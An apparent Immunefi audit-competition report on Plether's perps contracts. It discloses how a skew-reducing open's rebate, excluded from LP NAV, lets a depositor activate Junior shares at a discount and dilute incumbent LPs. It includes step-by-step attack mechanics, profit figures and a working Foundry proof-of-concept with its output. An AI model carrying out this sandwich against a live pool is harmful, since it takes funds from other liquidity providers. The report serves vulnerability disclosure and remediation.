# \#97812 [SC-Critical] Skew-reducing open rebates are paid from pool cash but excluded from LP NAV, letting a depositor activate Junior shares at a discount and dilute incumbent LPs

**Submitted on Nov 3rd 2026 at 11:15:03 UTC by @Grant4969 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97812
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

An open that reduces market skew earns a negative VPI. The engine pays that rebate immediately out of `HousePool` cash into the trader's clearinghouse custody (`poolRebatePayoutAssets`, `pool.payOut`), and in the same transaction locks the identical amount as the account's negative-VPI reserve. That reserve is non-withdrawable (`_spendableActionReserveAssets` and `_requireActionReserveDecreaseAboveProtectedFloor` keep it under a protected floor), and it is returned to the pool in full on every exit: the lifetime clamp in `CloseAccountingLib` charges at least `-vpiAccrued` back on close, and liquidation claws back `max(-vpiAccrued, 0)` from the reserve. Economically the pool therefore holds a fully funded, locked receivable equal to the rebate.

LP NAV does not count it. `HousePoolAccountingLib.buildReconcileSnapshot` prices the pool as `physicalAssets + terminalLpPriceDeltaAssets − traderClaimBalanceAssets`, and `SECURITY.md` states that neither anticipated VPI nor its reserve enters terminal `K` or the symmetric NAV. Junior deposit activation takes its price straight from that reconciled `juniorPrincipal`. So while a skew-reducing position is open, Junior NAV is understated by the rebate `R`, and the party who controls when such a position is open controls when deposits are priced.

The attack is a sandwich around the LP epoch boundary: request a large Junior deposit for epoch `E`; seconds before `E` starts, open a position that flattens the existing skew, pulling `R = k·S²/(2D)` out of pool cash; after the boundary, settle the epoch through the Router (permissionless) so the deposit activates against `NAV − R`; close the position, which returns `R` to the pool through the clamp; redeem after the one-hour cooldown. The new shares own a pro-rata slice of the returned `R`, taken from the incumbents.

With the release parameters, a 10M USDG Junior pool, a natural 39 % LONG skew and a 30M deposit, the attacker nets +2,577 USDG per round and incumbents lose 5,697 USDG (the difference is execution fees). Because the rebate scales with `S²/D` and `maxSkewRatio` only constrains skew *increases*, an attacker who first withdraws its own LP stake shrinks `D` toward `S` and enlarges the hole: with a 9.8M skew against a 10M pool and a 35M deposit, one round yields +29,504 USDG for the attacker and −37,345 USDG for incumbents (0.37 % of their stake), leaving them below their 10M principal. Both scenarios run end to end through the production `OrderRouter` and Router-bound LP settlement in the PoC.

## Root cause

**1. The rebate leaves the pool as cash at open.** `packages/perps/src/libraries/CfdEnginePlanLib.sol` L333:

```solidity
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

`packages/perps/src/CfdEngineSettlementSidecar.sol` L442–L443:

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

`HousePool.payOut` decrements `accountedAssets` and transfers the tokens, so `totalAssets()` drops by `R` immediately.

**2. The same amount is locked as a protected, non-withdrawable receivable.** The planner raises the account's reserve target to `_negativeVpiReserveTarget(vpiAccrued + vpiAssets) = max(-(vpiAccrued + vpiAssets), 0)` (`CfdEnginePlanLib.sol` L48–L55, L347–L349) and the clearinghouse records it in `vpiRebateReserveBalances` (`MarginClearinghouse.sol` `lockVpiRebateReserve` / `reclassifyPnlPledgeToVpiRebateReserve`, L842–L866). Generic withdrawals and action charges cannot touch it:

```solidity
// MarginClearinghouse.sol L975–L983
function _spendableActionReserveAssets(address account) private view returns (uint256) {
    uint256 actionReserveBalanceAssets = reservedSettlementAssets[account];
    uint256 protectedActionReserveAssets =
        totalBountyReservationsAssets[account] + vpiRebateReserveBalances[account];
    ...
    return actionReserveBalanceAssets - protectedActionReserveAssets;
}
```

and `_requireActionReserveDecreaseAboveProtectedFloor` (L1656–L1667) reverts any decrease below `vpiRebateReserveBalances + totalBountyReservationsAssets`.

**3. It is always returned to the pool.** On a voluntary close, `packages/perps/src/libraries/CloseAccountingLib.sol` L112–L118:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

so the close charges at least the full negative lifetime VPI even when the pool has since grown and the curve would charge less (exactly the situation after the attacker's deposit lands). On liquidation, `_planLiquidationActionSettlement` (`CfdEnginePlanLib.sol` L1554–L1570) assesses `vpiClawbackAssets = _negativeVpiReserveTarget(pos.vpiAccrued)` and consumes it from the dedicated reserve or from withheld price gain.

**4. LP NAV ignores the receivable.** `packages/perps/src/libraries/HousePoolAccountingLib.sol` L60–L78:

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
...
snapshot.distributable = terminalAssets - terminalLiabilities;
```

`terminalLpPriceDeltaAssets` is the price-only terminal mark (`TerminalNavBookV2`); by design "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" (`SECURITY.md` L871–L872). Junior deposit activation is priced from the reconciled principal, `packages/perps/src/HousePool.sol` L915–L916:

```solidity
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
```

Between steps 1 and 3 the pool is therefore worth `NAV_true = NAV_reported + R`, and anyone who deposits during that window buys in at `NAV_reported`.

## Attack scenario

Let the pool have Junior NAV `J`, an existing one-sided skew `S` (built by other traders, who paid positive VPI into `J`), depth `D`, and let the attacker hold deposit capital `X`. All steps are permissionless.

1. Before the cutoff, `requestDeposit(X)` on the Junior `TrancheVault` for the next LP epoch `E`. (A pending Junior deposit is cancellable before maturity, so if the skew disappears the attacker walks away at no cost.)
2. Seconds before `E` begins, commit and execute an opposite-side open of size `S` through `OrderRouter.commitOrder` / `executeOrder`. Post-open skew is 0, the VPI is `−R` with `R = vpiFactor·S²/(2D)`, and `HousePool` pays `R` to the attacker's clearinghouse custody, where it is locked as reserve. `totalAssets()` falls by `R`.
3. Right after the boundary, call `OrderRouter.settleLpEpoch` with a fresh basket. The engine reconciles, `juniorPrincipal` reflects `J − R`, and the deposit mints `X·supply/(J − R)` shares instead of `X·supply/J`.
4. Close the position. The lifetime clamp charges `R` back; `totalAssets()` returns to `J + X` (plus fees). The attacker now owns `X/(X + J − R)` of the pool instead of `X/(X + J)`.
5. After `DEPOSIT_COOLDOWN` (1 hour) request redemption; the next settlement funds it in full.

Gross transfer from incumbents to the attacker per round: `R·X/(X + J − R)`; the attacker's net is that minus two execution fees on `S` (and the price change on `S` over the tens of seconds the hedge is open, which is symmetric and far smaller than `R`).

Amplifier: `maxSkewRatio` is checked only for skew-increasing opens, and LP redemptions are only bounded by the max-profit coverage floor, so an attacker who already holds Junior shares can redeem them first and shrink `D` toward `S`. Since `R ∝ S²/D`, the hole grows from the `maxSkewRatio²/2 = 0.08 %` of depth achievable without shrinking to ≈0.5 % of the remaining pool. The loss falls entirely on Junior because Senior is principal-protected; at the release `maxSeniorShareBps = 8000` the per-round loss ratio for Junior holders is multiplied accordingly.

## Impact

PoC results (release parameters, basket 1.10, incumbent Junior 10M USDG, control = identical history without the attacker's trades, via `vm.snapshotState` / `vm.revertToState`):

| Scenario | Natural skew | Deposit | Rebate pulled from NAV | Attacker net vs control | Incumbent Junior loss |
|---|---|---|---|---|---|
| Base: no prior stake, `D` = 10.0M | 3.9M notional (39 % of `D`) | 30M | 7,595.76 USDG (0.076 % of `D`) | **+2,576.86 USDG** | **−5,696.66 USDG** |
| Amplified: 15M stake withdrawn first, `D` ≈ 10.0M | 9.8M notional (≈98 % of `D`) | 35M | 47,972.57 USDG (0.48 % of `D`) | **+29,504.41 USDG** | **−37,344.53 USDG** (ends at 9,971,338 < 10M principal) |

The difference between the incumbent loss and the attacker's net is the two execution fees paid to the treasury (3,120 and 7,840 USDG). In both runs the attacker also ends above its starting wealth in absolute terms, i.e. the round trip is profitable, not merely better than the control.

The attack repeats every epoch in which a skew exists; each unit of capital cycles in roughly three epochs (request → activation → cooldown → redemption), so with the amplified geometry incumbents lose on the order of 0.37 % per round and several percent per day while the skew persists. Any other LP whose redemption is funded in the same settlement is paid at the understated NAV as well.

## Why this is not covered by the documented behaviour or the known-issue list

- `SECURITY.md` §"Exact symmetric LP NAV" (L849–L876) documents the accounting rule that the VPI reserve is not part of NAV. It does not disclose, and its stated goals contradict, the consequence shown here. The section's first security consequence is that "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV"; excluding a locked, fully funded, mandatorily returned receivable breaks that symmetry in the other direction, so new LPs enter *below* true NAV at the incumbents' expense.
- The reason given for exclusions in that section is to prevent *phantom receivables* (L861: value above an account's collectible cap). The negative-VPI reserve is the opposite of phantom: it is physical cash held under a protected floor (`SECURITY.md` L297, L866; `MarginClearinghouse.sol` L975–L983, L1656–L1667) that only an exact clawback or the lifetime clamp can consume. Its return to the pool is not a forecast; it is enforced on every exit path.
- The only round-trip the documentation addresses is the trader-side one: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips" (`SECURITY.md` L1443) and the `CloseAccountingLib` comment about LP-sandwich attacks by traders. Those protect the pool's cash over the position's lifetime; they do nothing about *who owns the pool* at the moment the cash is out. This report is the LP-side timing attack that the clamp does not touch.
- The program's known-issue list and the prior reports in `audits/` (pre-audit SC-M3 on rebate-backed opens settling below IMR; the scan items on deferred trader claims inflating depth and reducing VPI; the AI report's rebate payout items) concern admission and depth accounting, not deposit-NAV timing. None of them describes LP dilution through the rebate window.
- No trusted role is involved: order commitment, execution and `settleLpEpoch` are permissionless Router paths, and the attacker never needs to be the keeper.

### Feasibility note (per the program's feasibility standards)

The attacker cannot create the skew itself: opening one side on account A and the other on account B leaves NAV unchanged (A's positive VPI enters the pool, B's rebate leaves it). The attack needs an existing one-sided skew whose VPI the incumbents have already received. That is the normal state of a directional FX-basket perpetual (one side of the book is almost always heavier), it is publicly observable on-chain, and the attacker can wait for it; the pending deposit can be cancelled if it disappears. Everything else is under the attacker's control: deposit size, timing to the second, settling the epoch itself, and (for the amplifier) its own prior LP stake. Capital requirements are ordinary LP deposits that are returned in full; the only money at risk is the price exposure on `S` for a few tens of seconds. Under the program's "attack investment amount" and "financial risk to the attacker" standards, a bounded, recoverable deposit for a repeatable, positive-expected-value extraction is not grounds for downgrade; impact is assessed first and separately from feasibility.

## Recommendation

Make the symmetric NAV count the receivable the pool is guaranteed to collect, or stop creating it:

- In `buildReconcileSnapshot`, add the aggregate protected negative-VPI reserve (`Σ max(-vpiAccrued, 0)` across open positions, which equals `Σ vpiRebateReserveBalances` backing) to `terminalAssets`. It is fully funded, non-withdrawable and consumed only by clamp or clawback, so it cannot become a phantom receivable; or
- Do not pay the open rebate in pool cash at all: credit it as a non-cash entitlement on the position and net it against the close-time VPI, so the pool's cash and NAV are unaffected until the position's lifetime VPI is actually settled.

Either change removes the window in which deposit pricing and true pool value diverge. Blocking deposit activation while any negative-VPI reserve is outstanding is not a substitute, because the attacker could use the same position to deny activation to everyone else.


## Proof of Concept

## Proof of Concept

The test below uses only the repository's own harness (`test/perps/BasePerpTest.sol`, `MockPyth` from `packages/shared/test-support`) and the production Engine, Planner, Sidecars, `MarginClearinghouse`, `HousePool`, `TrancheVault`s and `OrderRouter` at the commit in scope. No contract in `packages/perps/src` is modified. Release parameters from `DEPLOYMENT.md` "Initial release parameters" are set and asserted in-test (`vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, `maintMarginBps 10`, `initMarginBps 20`, `fadMarginBps 300`, `baseCarryBps 500`, `bountyBps 10`, `keeperShareBps 5000`, `executionFeeBps 4`, `settlementBufferBps 25`). The basket mark is 1.10 (≠ $1.00) and stays constant, so the attacker's hedge has no price PnL and MockPyth confidence is zero (no adverse-confidence shift); a real run would add symmetric noise on `S` that is small against `R`. Every trade goes through `OrderRouter.commitOrder` / `executeOrder`, and every LP settlement inside the sandwich goes through `OrderRouter.settleLpEpoch` with a post-boundary basket.

Each test runs the honest history first (no attacker trades), snapshots, and then the attack from the same state, so the deltas isolate the effect of the attacker's open/close. Assertions are harm assertions: attacker wealth above the control and above its starting wealth; incumbent Junior value below the control (and below principal in the amplified case).

Save the test as `packages/perps/test/submission/VpiRebateNavDepositSandwich.t.sol` (any directory one level below `packages/perps/test/` works, because of the relative import of `BasePerpTest`) and run from `packages/perps` with the default profile:

```bash
git submodule update --init --recursive
FOUNDRY_SPARSE_MODE=true forge test --match-path 'test/submission/VpiRebateNavDepositSandwich.t.sol' -vv
```

`FOUNDRY_SPARSE_MODE=true` only limits compilation to this test's dependency closure (about one minute under the default via-IR profile); without it `forge test` compiles the whole package first and gives the same result. The test passes with identical numbers under the project's fast lane (`FOUNDRY_VIA_IR=false`).

Observed output (default via-IR profile):

```
Ran 2 tests for test/submission/VpiRebateNavDepositSandwich.t.sol:VpiRebateNavDepositSandwichTest
[PASS] test_Amplified_ShrinkDepthRebateNavDepositSandwich() (gas: 11129771)
  === AMPLIFIED: 15M stake withdrawn, ~10M depth vs ~9.8M skew, 35M deposit
  pool depth before sandwich: 10009682900487
  VPI rebate removed from NAV at activation: 47972568644
  deposit shares, control: 34973452681696049
  deposit shares, attack: 35141891107399335
  attacker wealth before sandwich: 50161523171029
  attacker wealth, control: 50161523156825
  attacker wealth, attack: 50191027566031
  incumbent junior value, control: 10008682850759
  incumbent junior value, attack: 9971338321554
  attacker incremental profit: 29504409206
  incumbent loss: 37344529205
[PASS] test_Base_RebateNavDepositSandwich() (gas: 10175722)
  === BASE: no prior stake, 10M depth, 39% natural skew, 30M deposit
  pool depth before sandwich: 10009601529819
  VPI rebate removed from NAV at activation: 7595757036
  deposit shares, control: 29977488790894065
  deposit shares, attack: 30000256673144532
  attacker wealth before sandwich: 30150000000000
  attacker wealth, control: 30149999986304
  attacker wealth, attack: 30152576847899
  incumbent junior value, control: 10008601506980
  incumbent junior value, attack: 10002904845385
  attacker incremental profit: 2576861595
  incumbent loss: 5696661595
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 14.13ms (16.57ms CPU time)
Ran 1 test suite in 14.87ms (14.13ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice A skew-reducing open is paid its negative VPI from HousePool cash immediately and the same amount is
///         locked as the account's non-withdrawable negative-VPI reserve. LP NAV used to price Junior deposit
///         activation excludes that reserve, so a depositor who opens such a position just before the epoch
///         boundary activates at a NAV that is lower than the pool's true value, then closes and lets the lifetime
///         clamp return the cash. Incumbent Junior holders are diluted; the depositor nets a profit.
///
///         Two scenarios, each compared against an identical honest history (control) via snapshot/revert:
///         - BASE: attacker holds no prior LP stake; depth 10M; natural LONG skew 39 % of depth (within
///           maxSkewRatio); attacker deposits 30M.
///         - AMPLIFIED: attacker first stakes 15M Junior, lets a natural 39 % skew build on the 25M pool, then
///           redeems its stake so depth shrinks to ~10M against a ~9.8M skew; attacker deposits 35M.
///
///         Everything goes through the production Router (commitOrder / executeOrder / settleLpEpoch) with the
///         repository's own harness and MockPyth; no contract under src/ is modified.
contract VpiRebateNavDepositSandwichTest is BasePerpTest {

    address internal naturalTrader = address(0x7A7A01);
    address internal attackerLp = address(0xA77AC401);
    address internal attackerTrader = address(0xA77AC402);

    uint256 internal constant P = 1.1e8; // basket != 1.00
    uint256 internal constant ATTACKER_TRADER_FUNDS = 150_000e6;

    struct Scenario {
        uint256 naturalSize; // natural one-sided LONG size (18 decimals)
        uint256 attackerStake; // prior Junior stake withdrawn before the sandwich (0 = none)
        uint256 attackerDeposit; // Junior deposit activated inside the sandwich
        uint256 minRebateBpsOfDepth; // sanity floor on the temporary NAV hole
    }

    struct Outcome {
        uint256 attackerWealth;
        uint256 incumbentValue;
        uint256 rebate;
        uint256 depositShares;
    }

    /// @dev Launch parameters from DEPLOYMENT.md "Initial release parameters".
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev Incumbent Junior LPs (this test contract) hold 10M USDG.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    // ------------------------------------------------------------------
    // Production-path helpers
    // ------------------------------------------------------------------

    function _basket(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, 0));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    /// @dev Commits through the production commit path and executes at the first post-commit tick.
    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        router.executeOrder(orderId, _mockPythUpdateData(P));
        assertEq(router.nextExecuteId(), 0, "order must have executed and left the queue");
    }

    /// @dev Router-bound LP settlement with a basket published after the epoch boundary (anyone may call it).
    function _settleViaRouter() internal {
        router.settleLpEpoch(_basket(P, vm.getBlockTimestamp()));
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(attackerLp) + settlementToken.balanceOf(attackerTrader)
            + clearinghouse.balanceAssets(attackerTrader) + engine.traderClaimBalanceAssets(attackerTrader);
    }

    function _incumbentValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    function _redeemAll(
        address lp
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(juniorVault.depositEpochStart(requestId) + 2);
        _settleViaRouter();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        assertEq(claimable, shares, "full redemption must be funded");
        vm.prank(lp);
        assets = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    // ------------------------------------------------------------------
    // Scenario
    // ------------------------------------------------------------------

    function _setup(
        Scenario memory s
    ) internal {
        settlementToken.mint(attackerLp, s.attackerStake + s.attackerDeposit);
        vm.prank(attackerLp);
        settlementToken.approve(address(juniorVault), type(uint256).max);

        if (s.attackerStake > 0) {
            // Attacker joins as an ordinary Junior LP first.
            vm.prank(attackerLp);
            uint256 stakeId = juniorVault.requestDeposit(s.attackerStake, attackerLp, attackerLp);
            vm.warp(juniorVault.depositEpochStart(stakeId));
            pool.settleLpEpoch(0, 0);
            vm.prank(attackerLp);
            juniorVault.claimDepositShares(stakeId);
        }

        // An unrelated trader builds a one-sided LONG skew and pays positive VPI to the LPs.
        _fundTrader(naturalTrader, 150_000e6);
        _trade(naturalTrader, CfdTypes.Side.LONG, s.naturalSize, 100_000e6, false);

        if (s.attackerStake > 0) {
            // After the cooldown the attacker withdraws its stake, shrinking depth toward the natural skew.
            vm.warp(juniorVault.lastDepositTime(attackerLp) + juniorVault.DEPOSIT_COOLDOWN() + 1);
            _redeemAll(attackerLp);
        }

        _fundTrader(attackerTrader, ATTACKER_TRADER_FUNDS);
    }

    function _runSandwich(
        Scenario memory s,
        bool attack
    ) internal returns (Outcome memory out) {
        // 1. Request a Junior deposit for the next epoch.
        vm.prank(attackerLp);
        uint256 depositId = juniorVault.requestDeposit(s.attackerDeposit, attackerLp, attackerLp);
        uint256 boundary = juniorVault.depositEpochStart(depositId);

        // 2. Shortly before the boundary, flatten the skew with a SHORT: the pool pays the VPI rebate in cash.
        vm.warp(boundary - 32);
        if (attack) {
            uint256 poolBefore = pool.totalAssets();
            _trade(attackerTrader, CfdTypes.Side.SHORT, s.naturalSize, 60_000e6, false);
            out.rebate = poolBefore - pool.totalAssets();
        }

        // 3. Anyone settles the matured epoch through the Router with a post-boundary basket.
        vm.warp(boundary + 2);
        _settleViaRouter();
        vm.prank(attackerLp);
        out.depositShares = juniorVault.claimDepositShares(depositId);

        // 4. Close the SHORT: the lifetime clamp charges the whole rebate back into the pool.
        if (attack) {
            _trade(attackerTrader, CfdTypes.Side.SHORT, s.naturalSize, 0, true);
            (uint256 sizeAfter,,,,,,) = engine.positions(attackerTrader);
            assertEq(sizeAfter, 0, "attacker SHORT closed");
        }

        // 5. After the activation cooldown, redeem everything.
        vm.warp(juniorVault.depositEpochActivationTime(depositId) + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _redeemAll(attackerLp);

        out.attackerWealth = _attackerWealth();
        out.incumbentValue = _incumbentValue();
    }

    function _runAndAssert(
        Scenario memory s,
        string memory label
    ) internal {
        assertEq(engine.executionFeeBps(), 4, "launch executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "launch settlementBufferBps");

        _setup(s);
        uint256 depth = pool.totalAssets();
        uint256 attackerStart = _attackerWealth();

        uint256 snap = vm.snapshotState();
        Outcome memory control = _runSandwich(s, false);
        vm.revertToState(snap);
        Outcome memory attack = _runSandwich(s, true);

        emit log_string(label);
        emit log_named_uint("pool depth before sandwich", depth);
        emit log_named_uint("VPI rebate removed from NAV at activation", attack.rebate);
        emit log_named_uint("deposit shares, control", control.depositShares);
        emit log_named_uint("deposit shares, attack", attack.depositShares);
        emit log_named_uint("attacker wealth before sandwich", attackerStart);
        emit log_named_uint("attacker wealth, control", control.attackerWealth);
        emit log_named_uint("attacker wealth, attack", attack.attackerWealth);
        emit log_named_uint("incumbent junior value, control", control.incumbentValue);
        emit log_named_uint("incumbent junior value, attack", attack.incumbentValue);

        assertGt(attack.rebate * 10_000, depth * s.minRebateBpsOfDepth, "rebate below expected share of depth");
        assertGt(attack.depositShares, control.depositShares, "deposit activates at a discount");
        // HARM: the attacker gains and incumbents lose relative to the identical honest history.
        assertGt(attack.attackerWealth, control.attackerWealth, "sandwich profits over honest round trip");
        assertGt(attack.attackerWealth, attackerStart, "attacker ends with more than it started with");
        assertLt(attack.incumbentValue, control.incumbentValue, "incumbent junior diluted");
        emit log_named_uint("attacker incremental profit", attack.attackerWealth - control.attackerWealth);
        emit log_named_uint("incumbent loss", control.incumbentValue - attack.incumbentValue);
    }

    /// @notice No prior LP stake, depth stays at 10M, natural skew 39 % of depth (inside maxSkewRatio).
    function test_Base_RebateNavDepositSandwich() public {
        _runAndAssert(
            Scenario({
                naturalSize: 3_545_000e18, // ~3.9M USDG notional at 1.10
                attackerStake: 0,
                attackerDeposit: 30_000_000e6,
                minRebateBpsOfDepth: 5
            }),
            "=== BASE: no prior stake, 10M depth, 39% natural skew, 30M deposit"
        );
        _assertIncumbentsBelowPrincipalNote();
    }

    /// @notice Attacker shrinks depth by withdrawing its own stake first; the skew cap only binds skew increases.
    function test_Amplified_ShrinkDepthRebateNavDepositSandwich() public {
        _runAndAssert(
            Scenario({
                naturalSize: 8_909_000e18, // ~9.8M USDG notional at 1.10, 39% of the 25M pre-withdrawal depth
                attackerStake: 15_000_000e6,
                attackerDeposit: 35_000_000e6,
                minRebateBpsOfDepth: 40
            }),
            "=== AMPLIFIED: 15M stake withdrawn, ~10M depth vs ~9.8M skew, 35M deposit"
        );
        assertLt(_incumbentValue(), 10_000_000e6, "incumbent junior ends below its 10M principal");
    }

    function _assertIncumbentsBelowPrincipalNote() internal pure {
        // In the base scenario incumbents keep a sliver above principal only because the natural trader's VPI
        // and fees were paid to them earlier; the loss relative to the honest history is asserted above.
    }

}
```
